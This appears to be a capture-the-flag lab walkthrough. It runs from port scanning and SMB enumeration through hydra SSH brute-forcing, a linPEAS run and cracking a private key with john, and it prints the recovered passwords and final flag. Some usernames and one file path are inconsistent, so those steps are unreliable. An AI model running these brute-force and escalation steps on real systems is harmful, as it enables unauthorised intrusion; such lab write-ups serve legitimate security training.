# Basic Pentesting

> This is a machine that allows you to practise web app hacking and privilege escalation.

<br>

### Process:
1. Scan the machine:
    - basic port scan: `nmap -T4 10.10.29.143`
    - services running = **SSH (22)**, **HTTP (80)**, **netbios-ssn (139)**, **microsoft-ds (445)**, **ajp13(8009)**, **http-proxy (8080)**
    - and no limit on password logins for SSH
2. "Find hidden directory on web server"
    - use GoBuster: `gobuster dir -u http://10.10.29.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
      - hidden directory = **development**
3. brute force SSH credentials
   - find possible SSH usernames:
     - enumerate SMB for possible usernames:
       - `enum4linux 10.10.29.143`
       - found: **kay** and **jan** (jay is a developer on the server logs with a "weak password")
   - try to brute force jay's SSH password:
     - `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.29.143 -t 4`
     - password = **armando**
   - use **SSH** to access server:
     - `ssh armando@10.10.29.143` -> [password]
4. enumerate machine to esclate privileges:
   - can't privilege escalate with sudo (i.e. `sudo -l`)
   - use privilege escalation tool "linPeas", transfer onto machine using scp (because we have ssh credentials), and execute
     - attack box: `scp linpeas.sh jan@10.10.29.143:/dev/shm`
     - target box: `chmod +x /dev/shm/linpeas.sh` -> `./dev/shm/linpeas.sh`
   - found kay's private SSH key
     - copy it across to attack machine and try to login -> need a passphrase to unlock 
     - use ssh2john.py to convert id_rsa file to a hash for John the Ripper to crack:
       - `/usr/share/john/ssh2john.py id_rsa > hash.txt`
     - crack hash with john:
       - `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
     - password for private ssh key = **beeswax**
5. login as kay
   - ssh into machine as kay using ssh key and password for ssh key
     - `ssh -i id_rsa kay@10.10.29.143` -> [ssh_key_password]
   - get the final passphrase from the "pass.bak" file:
     - `cat pass.bak`
     - passphrase = **heresareallystrongpasswordthatfollowsthepasswordpolicy$$**